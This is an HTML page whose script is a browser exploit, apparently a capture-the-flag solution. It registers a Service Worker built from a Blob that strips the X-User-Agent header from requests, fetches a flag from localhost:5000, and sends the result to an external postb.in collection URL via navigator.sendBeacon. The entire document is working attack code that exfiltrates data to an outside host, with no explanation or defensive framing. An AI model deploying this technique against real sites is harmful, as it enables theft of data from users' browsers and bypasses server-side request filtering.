<!DOCTYPE html>
<html>
<body>
<script>
const EXFIL = "https://www.postb.in/1778660481006-3008019395638";

// Enregistre un Service Worker qui retire X-User-Agent
const swCode = `
self.addEventListener('fetch', event => {
  const url = event.request.url;
  if (url.includes('localhost:5000/flag')) {
    const newHeaders = new Headers();
    for (const [key, value] of event.request.headers.entries()) {
      if (key.toLowerCase() !== 'x-user-agent') {
        newHeaders.append(key, value);
      }
    }
    const newRequest = new Request(url, {
      method: event.request.method,
      headers: newHeaders,
      credentials: 'omit'
    });
    event.respondWith(fetch(newRequest));
  }
});
`;

const blob = new Blob([swCode], { type: "application/javascript" });
const swUrl = URL.createObjectURL(blob);

navigator.serviceWorker.register(swUrl, { scope: "/" })
  .then(() => navigator.serviceWorker.ready)
  .then(() => {
    return fetch("http://localhost:5000/flag", { credentials: "omit" });
  })
  .then(r => r.text())
  .then(data => {
    navigator.sendBeacon(EXFIL + "?flag=" + encodeURIComponent(data));
  })
  .catch(e => {
    navigator.sendBeacon(EXFIL + "?err=" + encodeURIComponent(e.toString()));
  });
</script>
</body>
</html>
